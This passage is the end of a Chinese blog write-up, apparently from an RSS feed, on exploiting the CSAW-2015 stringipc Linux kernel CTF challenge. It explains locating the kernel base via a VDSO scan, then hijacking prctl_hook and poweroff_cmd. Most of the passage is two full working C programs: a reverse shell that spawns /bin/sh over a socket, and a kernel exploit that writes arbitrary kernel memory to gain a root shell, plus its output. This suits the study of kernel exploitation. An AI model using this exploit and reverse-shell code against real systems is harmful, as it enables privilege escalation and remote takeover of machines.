title="漏洞利用"></a>漏洞利用</h2><p>首先可以利用VDSO的爆破得到VDSO的地址，而不难发现VDSO在vmlinux代码中，可以通过ida的可见字符串的__vdso_gettimeofday很容找到其偏移，从而得到kernel base。</p><p>而得到kernel base之后，就可以找到需要覆写的hook位置和字符串地址了。</p><p>通过将prctl_hook覆写为poweroff_work_func地址，并将poweroff_cmd处改为一个反弹shell的binary命令，监听端口就可以拿到shell。</p><p>在此处我没有调用selinux_disable就执行了call_usermodehelper，在我搭建的环境和强网杯solid_core给出的离线环境中都没有被selinux阻止。</p><h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><p>reverse_shell.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sockfd,numbytes;</span><br><span class="line">    <span class="keyword">char</span> buf[BUFSIZ];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">their_addr</span>;</span></span><br><span class="line">    <span class="keyword">while</span>((sockfd = socket(AF_INET,SOCK_STREAM,<span class="number">0</span>)) == <span class="number">-1</span>);</span><br><span class="line">    their_addr.sin_family = AF_INET;</span><br><span class="line">    their_addr.sin_port = htons(<span class="number">2333</span>);</span><br><span class="line">    their_addr.sin_addr.s_addr=inet_addr(<span class="string">"127.0.0.1"</span>);</span><br><span class="line">    bzero(&amp;(their_addr.sin_zero), <span class="number">8</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(connect(sockfd,(struct sockaddr*)&amp;their_addr,<span class="keyword">sizeof</span>(struct sockaddr)) == <span class="number">-1</span>);</span><br><span class="line">    dup2(sockfd,<span class="number">0</span>);</span><br><span class="line">    dup2(sockfd,<span class="number">1</span>);</span><br><span class="line">    dup2(sockfd,<span class="number">2</span>);</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>pwn_hijackprctl.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;       </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/auxv.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_IOCTL_BASE     0x77617363</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> buf_size;</span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">open_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">loff_t</span> index;</span><br><span class="line">    <span class="keyword">int</span> whence;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf,<span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i ;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;((len/<span class="number">8</span>)*<span class="number">8</span>);i+=<span class="number">8</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%lx"</span>,*(<span class="keyword">size_t</span> *)(buf+i) );</span><br><span class="line"><span class="keyword">if</span> (i%<span class="number">16</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" "</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_vdso_userspace</span><span class="params">(<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> addr=<span class="number">0</span>;</span><br><span class="line">addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line"><span class="keyword">if</span>(addr&lt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[-]cannot get vdso addr"</span>);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = len;i&lt;<span class="number">0x1000</span>;i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%x "</span>,*(<span class="keyword">char</span> *)(addr+i));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_vsdo_shellcode</span><span class="params">(<span class="keyword">char</span> *shellcode)</span></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> addr=<span class="number">0</span>;</span><br><span class="line">addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"vdso:%lx\n"</span>, addr);</span><br><span class="line"><span class="keyword">if</span>(addr&lt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[-]cannot get vdso addr"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (memmem((<span class="keyword">char</span> *)addr,<span class="number">0x1000</span>,shellcode,<span class="built_in">strlen</span>(shellcode) ))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">size_t</span> result = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> <span class="title">alloc_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> <span class="title">shrink_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> <span class="title">read_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> <span class="title">close_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> <span class="title">write_args</span>;</span></span><br><span class="line"><span class="keyword">size_t</span> addr = <span class="number">0xffffffff80000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> real_cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> target_addr ;</span><br><span class="line"><span class="keyword">size_t</span> kernel_base = <span class="number">0</span> ;</span><br><span class="line"><span class="keyword">size_t</span> selinux_disable_addr= <span class="number">0x351c80</span>;</span><br><span class="line"><span class="keyword">size_t</span> prctl_hook = <span class="number">0xeb7df8</span>;</span><br><span class="line"><span class="keyword">size_t</span> order_cmd = <span class="number">0xe4dfa0</span>;</span><br><span class="line"><span class="keyword">size_t</span> poweroff_work_func_addr =<span class="number">0xa39c0</span>;</span><br><span class="line"><span class="keyword">int</span> root_cred[<span class="number">12</span>];</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line"><span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">char</span> target[<span class="number">16</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(target,<span class="string">"try2findmep4nda"</span>);</span><br><span class="line"></span><br><span class="line">fd = open(<span class="string">"/dev/csaw"</span>,O_RDWR);</span><br><span class="line"><span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[-] open error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">alloc_args.buf_size = <span class="number">0x100</span>;</span><br><span class="line">alloc_args.id = <span class="number">-1</span>;</span><br><span class="line">ioctl(fd,CSAW_ALLOC_CHANNEL,&amp;alloc_args);</span><br><span class="line"><span class="keyword">if</span> (alloc_args.id == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[-] alloc_channel error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] now we get a channel %d\n"</span>,alloc_args.id);</span><br><span class="line">shrink_args.id = alloc_args.id;</span><br><span class="line">shrink_args.size = <span class="number">0x100</span>+<span class="number">1</span>;</span><br><span class="line">ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;shrink_args);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[+] we can read and write any momery"</span>);</span><br><span class="line"><span class="keyword">for</span>(;addr&lt;<span class="number">0xffffffffffffefff</span>;addr+=<span class="number">0x1000</span>)&#123;</span><br><span class="line">seek_args.id =  alloc_args.id;</span><br><span class="line">seek_args.index = addr<span class="number">-0x10</span> ;</span><br><span class="line">seek_args.whence= SEEK_SET;</span><br><span class="line">ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_args);</span><br><span class="line">read_args.id = alloc_args.id;</span><br><span class="line">read_args.buf = buf;</span><br><span class="line">read_args.count = <span class="number">0x1000</span>;</span><br><span class="line">ioctl(fd,CSAW_READ_CHANNEL,&amp;read_args);</span><br><span class="line"><span class="keyword">if</span>(( !<span class="built_in">strcmp</span>(<span class="string">"gettimeofday"</span>,buf+<span class="number">0x2cd</span>)) )&#123; <span class="comment">// ((*(size_t *)(buf) == 0x00010102464c457f)) &amp;&amp; </span></span><br><span class="line">result = addr;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] found vdso %lx\n"</span>,result);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(result == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"not found , try again "</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">kernel_base = addr&amp;<span class="number">0xffffffffff000000</span>;</span><br><span class="line">selinux_disable_addr+= kernel_base;</span><br><span class="line">prctl_hook += kernel_base;</span><br><span class="line">order_cmd += kernel_base;</span><br><span class="line">poweroff_work_func_addr += kernel_base;</span><br><span class="line"><span class="comment">//size_t argv_0 = kernel_base + 0x117ed20;</span></span><br><span class="line"><span class="comment">//size_t mce_do_trigger_addr = kernel_base + 0x0422ba;</span></span><br><span class="line"><span class="comment">//size_t env = kernel_base + 0xe4df20;</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] found kernel base: %lx\n"</span>,kernel_base);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] found prctl_hook: %lx\n"</span>,prctl_hook);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] found order_cmd : %lx\n"</span>,order_cmd);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] found selinux_disable_addr : %lx\n"</span>,selinux_disable_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] found poweroff_work_func_addr: %lx\n"</span>,poweroff_work_func_addr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// change *poweroff_cmd - &gt; "/reverse_shll\0"</span></span><br><span class="line"><span class="built_in">memset</span>(buf,<span class="string">'\0'</span>,<span class="number">0x1000</span>);</span><br><span class="line"><span class="comment">//*(size_t *)buf = selinux_disable_addr;</span></span><br><span class="line"><span class="built_in">strcpy</span>(buf,<span class="string">"/reverse_shell\0"</span>);</span><br><span class="line"><span class="comment">//strcpy(buf,"/bin/chmod 777 /flag\0");</span></span><br><span class="line">seek_args.id =  alloc_args.id;</span><br><span class="line">seek_args.index = order_cmd<span class="number">-0x10</span> ;</span><br><span class="line">seek_args.whence= SEEK_SET;</span><br><span class="line">ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_args);</span><br><span class="line">write_args.id = alloc_args.id;</span><br><span class="line">write_args.buf = buf;<span class="comment">//&amp;cat_flag;</span></span><br><span class="line">write_args.count = <span class="built_in">strlen</span>(buf);</span><br><span class="line">ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_args);</span><br><span class="line"><span class="built_in">memset</span>(buf,<span class="string">'\0'</span>,<span class="number">0x1000</span>);</span><br><span class="line">seek_args.id =  alloc_args.id;</span><br><span class="line">seek_args.index = order_cmd+<span class="number">14</span><span class="number">-0x10</span> ;</span><br><span class="line">seek_args.whence= SEEK_SET;</span><br><span class="line">ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_args);</span><br><span class="line">write_args.id = alloc_args.id;</span><br><span class="line">write_args.buf = buf;<span class="comment">//&amp;cat_flag;</span></span><br><span class="line">write_args.count = <span class="number">1</span>;</span><br><span class="line">ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_args);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">memset(buf,'\0',0x1000);</span></span><br><span class="line"><span class="comment">*(size_t *)buf = 1 ;</span></span><br><span class="line"><span class="comment">//strcpy(buf,"/bin//sh\0");</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">seek_args.id =  alloc_args.id;</span></span><br><span class="line"><span class="comment">seek_args.index = kernel_base +  0x1380118-0x10 ;</span></span><br><span class="line"><span class="comment">seek_args.whence= SEEK_SET;</span></span><br><span class="line"><span class="comment">ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_args);</span></span><br><span class="line"><span class="comment">write_args.id = alloc_args.id;</span></span><br><span class="line"><span class="comment">write_args.buf = buf;//&amp;cat_flag;</span></span><br><span class="line"><span class="comment">write_args.count = 20+1;</span></span><br><span class="line"><span class="comment">ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_args);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// change *prctl_hook -&gt; reboot_work_func_addr</span></span><br><span class="line"><span class="built_in">memset</span>(buf,<span class="string">'\0'</span>,<span class="number">0x1000</span>);</span><br><span class="line">*(<span class="keyword">size_t</span> *)buf = poweroff_work_func_addr;</span><br><span class="line">seek_args.id =  alloc_args.id;</span><br><span class="line">seek_args.index = prctl_hook<span class="number">-0x10</span> ;</span><br><span class="line">seek_args.whence= SEEK_SET;</span><br><span class="line">ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_args);</span><br><span class="line">write_args.id = alloc_args.id;</span><br><span class="line">write_args.buf = buf;<span class="comment">//&amp;cat_flag;</span></span><br><span class="line">write_args.count = <span class="number">20</span>+<span class="number">1</span>;</span><br><span class="line">ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_args);</span><br><span class="line"></span><br><span class="line"><span class="comment">// trag and get reverse shell</span></span><br><span class="line"><span class="keyword">if</span>(fork() == <span class="number">0</span> )&#123;</span><br><span class="line">prctl(addr,<span class="number">2</span>, addr,addr,<span class="number">2</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">"nc -l -p 2333"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终可以拿到root权限的反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> $ ./pwn</span><br><span class="line">[+] now we get a channel 1</span><br><span class="line">[+] we can <span class="built_in">read</span> and write any momery</span><br><span class="line">[+] found vdso ffffffff81e04000</span><br><span class="line">[+] found kernel base: ffffffff81000000</span><br><span class="line">[+] found prctl_hook: ffffffff81eb7df8</span><br><span class="line">[+] found order_cmd : ffffffff81e4dfa0</span><br><span class="line">[+] found selinux_disable_addr : ffffffff81351c80</span><br><span class="line">[+] found poweroff_work_func_addr: ffffffff810a39c0</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root)</span><br></pre></td></tr></table></figure><p>最后感谢simp1e师傅的帮助，学到了很多东西。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>强网杯出题思路-solid_core: <a href="http://simp1e.leanote.com/post/%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF-solid_core" target="_blank" rel="noopener">http://simp1e.leanote.com/post/%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF-solid_core</a></p><p>Bypassing SMEP Using vDSO Overwrites：<a href="https://hardenedlinux.github.io/translation/2015/11/25/Translation-Bypassing-SMEP-Using-vDSO-Overwrites.html" target="_blank" rel="noopener">https://hardenedlinux.github.io/translation/2015/11/25/Translation-Bypassing-SMEP-Using-vDSO-Overwrites.html</a></p><p>linux kernel pwn notes: <a href="https://xz.aliyun.com/t/2306" target="_blank" rel="noopener">https://xz.aliyun.com/t/2306</a></p><p>idr 机制：<a href="http://blog.chinaunix.net/uid-21762157-id-4165782.html" target="_blank" rel="noopener">http://blog.chinaunix.net/uid-21762157-id-4165782.html</a></p><p><a href="https://github.com/mncoppola/StringIPC/blob/master/solution/solution.c" target="_blank" rel="noopener">https://github.com/mncoppola/StringIPC/blob/master/solution/solution.c</a></p><p>给shellcode找块福地－通过VDSO绕过PXN:<a href="https://bbs.pediy.com/thread-220057.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-220057.htm</a></p><p>New Reliable Android Kernel Root Exploitation Techniques：  <a href="http://t.cn/Rftu7Dn" target="_blank" rel="noopener">http://t.cn/Rftu7Dn</a></p>]]></content>
    
    <summary type="html">
    
      本篇主要以CSAW-2015-CTF的stringipc题目为例，分析了三种从内存任意读写到权限提升的利用方法。
    
    </summary>
    
    
      <category term="KERNEL" scheme="http://p4nda.top/tags/KERNEL/"/>
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
      <category term="Linux" scheme="http://p4nda.top/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>护网杯 CTF 2018线上预选赛PWN题解</title>
    <link href="http://p4nda.top/2018/10/14/hwb-ctf-2018/"/>
    <id>http://p4nda.top/2018/10/14/hwb-ctf-2018/</id>
    <published>2018-10-14T09:30:00.000Z</published>
    <updated>2018-10-14T10:53:38.352Z</updated>
    
